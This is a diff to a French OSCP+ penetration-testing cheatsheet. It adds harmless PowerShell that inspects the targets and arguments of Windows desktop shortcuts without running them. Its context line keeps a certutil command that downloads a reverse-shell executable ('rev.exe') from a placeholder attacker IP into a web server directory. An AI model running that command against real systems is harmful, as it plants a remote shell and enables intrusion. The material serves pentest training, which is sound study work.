@@ -676,6 +676,36 @@ cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe 
 
 ```
 
+
+## Examiner les raccourcis Windows
+
+Les raccourcis .lnk peuvent contenir un chemin cible, des arguments et un répertoire de travail. Les examiner avant exécution pour comprendre le comportement demandé à l'utilisateur.
+
+### Inventorier les raccourcis du Bureau
+
+Recenser les fichiers .lnk accessibles par le compte courant.
+
+<p class="oscp-command-note">Inventorier les raccourcis du Bureau.</p>
+
+```powershell
+Get-ChildItem "$env:USERPROFILE\Desktop" -Filter '*.lnk' -File -ErrorAction SilentlyContinue
+```
+
+### Lire la cible et les arguments
+
+Interroger les métadonnées de chaque raccourci via l'interface COM de Windows, sans l'exécuter.
+
+<p class="oscp-command-note">Lire la cible et les arguments.</p>
+
+```powershell
+$Shell = New-Object -ComObject WScript.Shell
+Get-ChildItem "$env:USERPROFILE\Desktop" -Filter '*.lnk' -File | ForEach-Object { $Lnk = $Shell.CreateShortcut($_.FullName); [PSCustomObject]@{Nom=$_.Name; Cible=$Lnk.TargetPath; Arguments=$Lnk.Arguments} }
+```
+
+**Référence complémentaire :** [krovs/oscp-notes](https://github.com/krovs/oscp-notes/blob/main/docs/12_client-side_attacks.md). Explications rédigées pour SKILL-ISSUE.
+
+<!-- notes-krovs-2026 -->
+
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
